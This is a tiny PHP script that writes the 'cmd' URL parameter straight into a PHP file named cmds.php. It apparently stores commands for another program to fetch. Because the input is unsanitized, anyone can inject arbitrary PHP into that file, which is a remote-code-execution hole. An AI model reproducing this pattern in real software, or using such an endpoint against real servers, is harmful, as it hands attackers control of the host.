<?php
$data = $_GET["cmd"];
function createNewFile($data){
$myfile = fopen("cmds.php", "w") or die("Unable to open file!");
fwrite($myfile, "<?php\n \$cmd = \"");
fwrite($myfile, $data);
fwrite($myfile, '";');
fclose($myfile);
}

createNewFile($data);

echo "OK";